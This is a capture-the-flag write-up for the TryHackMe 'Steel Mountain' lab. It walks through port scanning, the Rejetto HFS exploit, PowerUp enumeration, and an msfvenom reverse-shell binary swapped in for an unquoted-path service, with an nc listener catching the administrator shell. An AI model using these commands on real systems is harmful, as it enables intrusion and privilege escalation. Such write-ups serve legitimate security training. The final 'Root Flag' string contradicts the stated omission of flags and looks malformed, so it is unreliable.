## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our [Kali Room](https://tryhackme.com/room/kali).

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
```

## IP-Address
```IP-Address
10.10.31.167
```

## Rustscan 
```bash
$ rustscan -a 10.10.31.167 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 124
135/tcp   open  msrpc         syn-ack ttl 124
139/tcp   open  netbios-ssn   syn-ack ttl 124
445/tcp   open  microsoft-ds  syn-ack ttl 124
3389/tcp  open  ms-wbt-server syn-ack ttl 124
5985/tcp  open  wsman         syn-ack ttl 124
8080/tcp  open  http-proxy    syn-ack ttl 124
47001/tcp open  winrm         syn-ack ttl 124
49152/tcp open  unknown       syn-ack ttl 124
49153/tcp open  unknown       syn-ack ttl 124
49154/tcp open  unknown       syn-ack ttl 124
49155/tcp open  unknown       syn-ack ttl 124
49156/tcp open  unknown       syn-ack ttl 124
49163/tcp open  unknown       syn-ack ttl 124
49164/tcp open  unknown       syn-ack ttl 124
```

## Port 80
```html

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Steel Mountain</title>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center>
<a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
</center>
</body>
</html>
```
Employee of the Month `Bill harper`
After this navigate to `http://10.10.31.167:8080` there we get a link to the server info 
which is `Rejetto HTTP File Server`
then we search on exploitdb for this server exploit and found the cve Information 
`CVE-2014-6287`
and got the `metasploit` module for this 
`exploit/windows/http/rejetto_hfs_exec` this module with options 
```Options
set RHOSTS <IP>
Set RPORT 8080
Set LHOST 10.17.36.74
```

## BOOM 
Got the reverse shell and got flag as 
`C:\Users\bill\Desktop` here i got the User.txt
```bash
meterpreter > ls
Listing: C:\Users\bill\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt

meterpreter > cat user.txt
��[flag/hash omitted]
```
First Flag is 
```Flag
[flag/hash omitted]
```

Then I used `Metasploit` to 
```bash
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\bill\Desktop
==============================
Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  600580  fil   2025-07-28 05:33:04 -0400  PowerUp.ps1
100666/rw-rw-rw-  282     fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70      fil   2019-09-27 08:42:38 -0400  user.txt
meterpreter > upload PowerUp.ps1
[*] Uploading  : /home/kali/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /home/kali/PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > pwd
Path
----
C:\Users\bill\Desktop
PS > . .\PowerUp.ps1
PS > Invoke-Allchecks
```
and for PowerUp.ps1 file I used Github repo
```repo
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```
This lists the services running on the window and in between them there is one which attract my attention
```bash
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```
these are the service which can be used for gaining `Administrator` shell 
for Taking Root Shell we need to came out first by` ctrl+C`
and then upload file using meterpreter but first kill the active service which is running on the machine
And For uploading Reverse-shell we need to first create it using msfvenom
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.17.36.74 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
```
Then We used meterpreter
```bash
meterpreter > execute -f sc.exe -a "stop AdvancedSystemCareService9"
Process 3064 created.
meterpreter > upload Advanced.exe "C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe"
[*] Uploading  : /home/kali/Advanced.exe -> C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /home/kali/Advanced.exe -> C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
[*] Completed  : /home/kali/Advanced.exe -> C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
meterpreter > execute -f sc.exe -a "start AdvancedSystemCareService9"
Process 1084 created.
meterpreter > execute -f sc.exe -a "start AdvancedSystemCareService9"
Process 828 created.
meterpreter > 
```
on parallel we run 
```bash
$ nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.17.36.74] from (UNKNOWN) [10.10.140.9] 49365
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>cd .. cd .. cd ..
> cd /Users/Administrator/Desktop
>type root.txt
[flag/hash omitted]
```

## Root Flag
```bash
9af5f314f57607c00fd09803a587db801
```